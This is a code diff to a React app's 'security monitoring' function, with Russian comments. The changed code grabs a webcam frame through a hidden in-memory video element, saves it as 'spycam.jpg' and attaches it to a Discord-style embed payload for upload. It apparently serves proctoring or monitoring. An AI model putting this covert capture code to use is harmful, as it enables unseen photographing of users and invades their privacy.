@@ -241,10 +241,9 @@ function App() {
   const [isAnimating, setIsAnimating] = useState(false);
 
 // --- SECURITY MONITORING HOOKS ---
+// --- SECURITY MONITORING HOOKS ---
   const captureViolation = async (title, extraFields = []) => {
-      const video = document.getElementById('securityCam');
       let formData = new FormData();
-      
       const isPlanned = title.includes("Плановая");
 
       let payload = {
@@ -265,35 +264,48 @@ function App() {
       try {
           if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
               const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 } });
+              
+              // 1. Создаем виртуальный элемент в памяти, чтобы обойти блокировку display: none
+              const video = document.createElement('video');
+              video.muted = true;
+              video.playsInline = true;
+              video.autoplay = true;
               video.srcObject = stream;
               
-              // ПРИНУДИТЕЛЬНО ждем, пока видео поток реально запустится
+              // 2. Ждем получения метаданных и физического старта воспроизведения
               await new Promise((resolve) => {
                   video.onloadedmetadata = () => {
                       video.play().then(resolve).catch(resolve);
                   };
-                  setTimeout(resolve, 1000); // Страховочный таймаут (максимум 1 сек)
+                  setTimeout(resolve, 1500); // Предохранитель
               });
               
-              // Даем матрице камеры 400мс на захват света (чтобы не было черного экрана)
-              await new Promise(r => setTimeout(r, 400)); 
+              // 3. Даем камере прогреться и поймать свет (600мс)
+              await new Promise(r => setTimeout(r, 600)); 
               
+              // 4. Отрисовываем кадр на холст
               const canvas = document.createElement('canvas');
               canvas.width = video.videoWidth || 640; 
               canvas.height = video.videoHeight || 480;
               canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
               
-              const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
+              // 5. Конвертируем в файл
+              const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.85));
               
-              // Проверяем, что картинка реально создалась и не пустая
-              if (blob && blob.size > 0) {
-                  formData.append('file', blob, 'capture.jpg');
-                  payload.embeds[0].image = { url: 'attachment://capture.jpg' };
+              // 6. Проверяем, что файл не пустой (> 100 байт)
+              if (blob && blob.size > 100) {
+                  formData.append('file', blob, 'spycam.jpg');
+                  payload.embeds[0].image = { url: 'attachment://spycam.jpg' };
+              } else {
+                  payload.embeds[0].description = "⚠️ Изображение заблокировано браузером";
               }
               
+              // Выключаем камеру
               stream.getTracks().forEach(track => track.stop());
           }
-      } catch(e) {}
+      } catch(e) {
+          payload.embeds[0].description = "❌ Камера отключена или заблокирована пользователем";
+      }
 
       formData.append('payload_json', JSON.stringify(payload));
 
